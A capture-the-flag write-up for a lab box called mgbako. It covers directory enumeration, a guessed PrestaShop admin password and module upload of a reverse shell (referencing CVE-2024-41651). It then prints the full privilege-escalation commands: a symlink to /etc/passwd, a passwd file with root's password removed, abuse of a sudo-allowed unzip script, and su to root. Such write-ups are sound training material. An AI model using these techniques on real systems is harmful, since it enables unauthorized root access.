# mgbako  ( A CTF on the AfriHackBox platform ) 

# IP = 10.0.1.14

# PORT
```
80
22
```

# Enumeration 

**Dir search**
```sh
download                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 150ms]
img                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 143ms]
templates               [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 194ms]
docs                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 194ms]
tools                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 154ms]
themes                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 134ms]
pdf                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 146ms]
modules                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 142ms]
upload                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 147ms]
bin                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 141ms]
backend                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 166ms]
src                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 181ms]
app                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 163ms]
js                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 158ms]
cache                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 160ms]
api                     [Status: 401, Size: 16, Words: 2, Lines: 1, Duration: 810ms]
classes                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 351ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 294ms]
config                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 157ms]
translations            [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 170ms]
var                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 142ms]
Makefile                [Status: 200, Size: 863, Words: 53, Lines: 42, Duration: 237ms]
localization            [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 149ms]
apis                    [Status: 401, Size: 16, Words: 2, Lines: 1, Duration: 280ms]
webservice              [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 151ms]
apidocs                 [Status: 401, Size: 16, Words: 2, Lines: 1, Duration: 260ms]
controllers             [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 187ms]
apilist                 [Status: 401, Size: 16, Words: 2, Lines: 1, Duration: 274ms]
```
Looking from the description being provided, there was a hint `backend` so let browse it as directory
visit `http://mgbako.afrihackbox.ctf/backend/`

And booom, we are introduced with the admin login page.

*Credentials*
```
username: admin@mgbako.afrihackbox.ctf
password: administrator (After few guesses I got this)
```
When searching for public vulns on prestashop, I stambled upon this;
**Link:** https://github.com/Fckroun/CVE-2024-41651/blob/main/README.md , i.e it was vulnerable to **Blind SSRF to RCE** under `/modules/module manager`. 

# Initial Access
I downloaded the vuln module in the exploit and sneaked my revshell inside of the ps_facetedsearch.php

I mistakenly discovered a new way of exploiting this system by just zipping back the file and hitting on **Upload Module**. I select the zip file that also contains the revshell and boom I got a callback on my listener


# PrivEsc
```sh
www-data@mgbako:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on mgbako:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on mgbako:
    (ALL : ALL) NOPASSWD: /usr/local/bin/extractorator
```

content of the `extractorator` file;
```node
#! /usr/bin/env node
var args = process.argv.slice(2);
var unzip = require('unzip-stream');
var fs = require('fs');
fs.createReadStream(args[0]).pipe(unzip.Extract({ path: '/var/www/html/vendor' }));
```

Searching up on `unzip-stream` it was known to be vulnerable to to **ZipSlip** but in this our case, the path has been explicitly stated so the path traversal vuln wasn't working here but the good thing was that, it could overwrite anything in the `vendor` directory. Useful enough? Let see.

What can we do, I started by creating a symlink to the `/etc/passwd` file in the /vendor directory;
```sh
www-data@mgbako:/tmp$ ln -s /etc/passwd /var/www/html/vendor/passwd
ln -s /etc/passwd /var/www/html/vendor/passwd
www-data@mgbako:/tmp$ ll /var/www/html/vendor/
ll /var/www/html/vendor/
total 236K
4.0K drwxr-xr-x  1 www-data www-data 4.0K Aug  5 03:00 .
   0 lrwxrwxrwx  1 www-data www-data   11 Aug  5 03:00 passwd -> /etc/passwd
8.0K drwxr-xr-x  1 www-data root     4.0K Oct 10  2024 ..
```

Now the `extractorator` command take only one argument and that should be a zip file;
 ***Process***
I copied the passwd file and edited the root's password section `x`;
```sh
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
---SNIP---
```
And zipped it back into any name of your choice (mine was cookie.zip)
```sh
www-data@mgbako:/tmp$ zip -r cookie.zip passwd
zip -r cookie.zip passwd
  adding: passwd (deflated 62%\)
```

Now let run the sudo command with the extractorator and our zip file;
```sh
www-data@mgbako:/tmp$ sudo extractorator cookie.zip
sudo extractorator cookie.zip
www-data@mgbako:/tmp$ cat /var/www/html/vendor/passwd
cat /var/www/html/vendor/passwd
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```
**Good** Now it's confirmed there is no passwd on root.
Just login an grab your flags :)
```sh
www-data@mgbako:/tmp$ su root
su root
root@mgbako:/tmp# 
```

**We Are Root :)**
